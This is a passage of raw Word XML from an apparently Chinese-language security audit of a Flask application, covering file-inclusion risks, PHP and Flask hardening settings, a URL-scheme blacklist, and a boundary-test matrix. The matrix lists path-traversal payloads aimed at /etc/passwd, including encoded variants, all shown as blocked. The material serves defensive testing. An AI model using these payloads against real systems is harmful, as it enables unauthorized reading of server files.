        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>LFI 目录穿越</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>open("../../etc/passwd")</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不需要</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>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已修复</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>（白名单阻断）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>RFI 远程包含</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>urllib.request.urlopen(url).read()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不需要，但需要另写代码</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 系统未使用 urllib</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>XXE 外部实体</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>XML 解析器读取外部文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不需要</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 系统未使用 XML</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>SSTI 模板注入</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Jinja2 模板语法注入</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>❌ 不需要</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">✅ </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>已修复</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>（Bleach + 移除 `\</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>safe`）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>6.3 PHP 伪协议配置加固建议（仅 PHP 环境参考）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>如果本系统迁移至 PHP 环境，或存在 PHP 与 Flask 混合部署的场景，以下为 PHP 伪协议配置加固建议：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>; php.ini — 禁用危险伪协议</w:t>
        <w:br/>
        <w:t>allow_url_fopen = Off</w:t>
        <w:br/>
        <w:t>allow_url_include = Off</w:t>
        <w:br/>
        <w:br/>
        <w:t>; 禁用不必要的流包装器</w:t>
        <w:br/>
        <w:t>; 在 php.ini 中设置：</w:t>
        <w:br/>
        <w:t>disable_functions = exec, system, shell_exec, passthru, popen, proc_open</w:t>
        <w:br/>
        <w:t>disable_classes =</w:t>
        <w:br/>
        <w:br/>
        <w:t>; .htaccess / httpd.conf — 限制文件包含路径</w:t>
        <w:br/>
        <w:t>php_admin_value include_path "/var/www/html/include"</w:t>
        <w:br/>
        <w:t>php_admin_value open_basedir "/var/www/html:/tmp"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>6.4 Python Flask 环境伪协议加固配置</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>针对本系统的实际 Flask 环境，推荐以下纵深配置：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># [扩展加固] 在 app.py 中添加 URL scheme 校验拦截层（可选增强）</w:t>
        <w:br/>
        <w:t>from urllib.parse import urlparse</w:t>
        <w:br/>
        <w:br/>
        <w:t>SCHEME_BLACKLIST = {"file", "data", "http", "https", "ftp", "php", "expect", "zip", "phar", "gopher"}</w:t>
        <w:br/>
        <w:br/>
        <w:t>def is_safe_path(name):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """检测名称是否包含伪协议或不可信 scheme"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 检查是否包含 :// （协议标识）</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "://" in name:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        scheme = name.split("://")[0].lower()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if scheme in SCHEME_BLACKLIST:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return False</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 检查常见伪协议前缀</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for scheme in SCHEME_BLACKLIST:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if name.lower().startswith(scheme + ":"):</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return False</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return True</w:t>
        <w:br/>
        <w:br/>
        <w:t># 在 /page 路由中使用（目前已通过白名单拦截，此函数作为纵深防御层）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">&gt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>结论</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>：本系统为 Python Flask 架构，PHP 伪协议均不适用。当前的白名单方案已从根本上杜绝了 LFI/RFI 攻击面。上述伪协议分析作为审计完整性参考，同时为非 Python 环境迁移提供加固指引。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>七、边界测试与异常测试</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>7.1 LFI 目录穿越边界测试矩阵</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>完整覆盖 12 类路径穿越 payload，验证白名单修复的有效性：</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试类别</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试用例（name 参数值）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>预期</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>实际</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>标准目录穿越</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>../../etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>深层目录穿越</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>../../../../../../../../../etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>URL 编码穿越</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>%2e%2e%2fetc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>双层 URL 编码</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>%252e%252e%252fetc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>UTF-8 编码穿越</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>..%c0%afetc/passwd</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>（UTF-8 过长的 /）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>404</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
